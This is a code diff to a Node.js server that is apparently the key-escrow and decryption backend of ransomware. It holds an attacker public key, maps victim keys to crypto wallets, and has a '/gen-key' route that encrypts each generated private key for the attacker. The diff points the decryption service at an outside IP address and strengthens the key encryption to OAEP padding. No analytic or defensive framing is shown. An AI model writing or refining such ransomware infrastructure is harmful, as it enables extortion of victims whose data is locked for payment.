@@ -20,7 +20,7 @@ const wallets = {}; // Matches pub_keys with crypto wallet
 
 let attk_pub = null;
 const attk_pub_path = "./attk_pub.pem";
-const decrypter_url = "http://localhost:5000/decrypt";
+const decrypter_url = "http://34.44.100.30:5000/decrypt";
 
 var key_count = 0;
 
@@ -100,7 +100,8 @@ app.get('/gen-key', (req, res) => {
     const secret_priv = crypto.publicEncrypt(
         {
             key: attk_pub,
-            padding: crypto.constants.RSA_PKCS1_PADDING
+            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+            oaepHash: "sha256"
         },
         Buffer.from(privateKey)
     );
